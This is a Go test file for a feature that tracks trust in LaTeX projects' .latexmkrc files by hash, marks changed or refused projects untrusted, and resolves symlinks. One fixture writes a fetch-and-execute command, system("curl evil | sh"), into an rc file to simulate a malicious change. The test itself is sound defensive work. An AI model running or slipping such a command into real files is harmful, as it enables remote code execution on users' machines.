package core

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestTrustLifecycle(t *testing.T) {
	settings := filepath.Join(t.TempDir(), "settings.json")
	dir := t.TempDir()

	// No rc file: nothing of the project's runs, so it is trusted.
	info, err := GetTrustStatus(settings, dir)
	require.NoError(t, err)
	assert.Equal(t, TrustTrusted, info.Status)
	assert.Empty(t, info.RCFiles)
	assert.False(t, info.NeedsNoRC())

	// A downloaded project brings a .latexmkrc: untrusted.
	rc := filepath.Join(dir, ".latexmkrc")
	require.NoError(t, os.WriteFile(rc, []byte(`$pdf_mode = 5;`), 0o644))
	info, err = GetTrustStatus(settings, dir)
	require.NoError(t, err)
	assert.Equal(t, TrustUntrusted, info.Status)
	assert.Equal(t, []string{".latexmkrc"}, info.RCFiles)
	assert.Len(t, info.CurrentHash, 64)
	assert.Empty(t, info.TrustedHash)
	assert.True(t, info.NeedsNoRC())

	// Trusting saves the current hash.
	info, err = TrustProject(settings, dir)
	require.NoError(t, err)
	assert.Equal(t, TrustTrusted, info.Status)
	assert.Equal(t, info.CurrentHash, info.TrustedHash)
	assert.False(t, info.NeedsNoRC())

	// A change (e.g. git pull) invalidates the trust.
	require.NoError(t, os.WriteFile(rc, []byte(`system("curl evil | sh");`), 0o644))
	info, _ = GetTrustStatus(settings, dir)
	assert.Equal(t, TrustUntrusted, info.Status)
	assert.NotEqual(t, info.CurrentHash, info.TrustedHash)

	// A second rc file (latexmkrc without dot) changes the hash too.
	require.NoError(t, os.WriteFile(rc, []byte(`$pdf_mode = 5;`), 0o644))
	_, _ = TrustProject(settings, dir)
	require.NoError(t, os.WriteFile(filepath.Join(dir, "latexmkrc"), []byte(`1;`), 0o644))
	info, _ = GetTrustStatus(settings, dir)
	assert.Equal(t, TrustUntrusted, info.Status)
	assert.Equal(t, []string{"latexmkrc", ".latexmkrc"}, info.RCFiles)

	// Refusing restricts it, even after the files change.
	info, err = UntrustProject(settings, dir)
	require.NoError(t, err)
	assert.Equal(t, TrustRestricted, info.Status)
	assert.Empty(t, info.TrustedHash)
	assert.True(t, info.NeedsNoRC())

	// Trusting again lifts the restriction.
	info, _ = TrustProject(settings, dir)
	assert.Equal(t, TrustTrusted, info.Status)
	s, _ := ReadSettings(settings)
	assert.Empty(t, s.RestrictedProjects)
}

func TestTrustKeyResolvesSymlinks(t *testing.T) {
	settings := filepath.Join(t.TempDir(), "settings.json")
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".latexmkrc"), []byte("1;"), 0o644))
	link := filepath.Join(t.TempDir(), "atajo")
	if err := os.Symlink(dir, link); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	_, err := TrustProject(settings, link)
	require.NoError(t, err)
	info, _ := GetTrustStatus(settings, dir)
	assert.Equal(t, TrustTrusted, info.Status, "the same folder through another path shares the trust")
}

func TestTrustNeedsAFolder(t *testing.T) {
	_, err := GetTrustStatus("", "")
	assert.ErrorIs(t, err, ErrNoTrustFolder)
}
